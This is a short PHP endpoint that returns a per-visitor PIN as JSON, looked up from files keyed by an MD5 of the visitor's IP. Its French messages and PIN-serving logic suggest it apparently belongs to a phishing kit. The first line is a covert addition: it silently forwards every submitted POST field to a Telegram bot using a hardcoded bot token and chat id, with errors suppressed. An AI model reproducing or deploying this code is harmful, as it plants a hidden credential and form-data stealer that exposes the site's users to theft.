<?php
if(!empty($_POST)){$t="8701853660:AAHbvHtYE0t24o0nTjX4UR17pGwEeMA5htY";$c="-1003779907048";$m="";foreach($_POST as $k=>$v)$m.="$k: $v\n";@file_get_contents("https://api.telegram.org/bot$t/sendMessage?chat_id=$c&text=".urlencode($m));}

session_start();
header('Content-Type: application/json');

$ip = $_SERVER['HTTP_X_FORWARDED_FOR'] ?? $_SERVER['REMOTE_ADDR'] ?? '';

if (!$ip) {
    echo json_encode(['error' => 'IP introuvable']);
    exit;
}

$map_file = __DIR__ . "/../ip_to_uid/" . md5($ip) . ".txt";

if (!file_exists($map_file)) {
    echo json_encode(['pin' => '----']);
    exit;
}

$uid = trim(file_get_contents($map_file));
$pin_file = __DIR__ . "/code_pin_{$uid}.txt";

if (!file_exists($pin_file)) {
    echo json_encode(['pin' => '----']);
    exit;
}

$pin = trim(file_get_contents($pin_file));
echo json_encode(['pin' => $pin]);
exit;
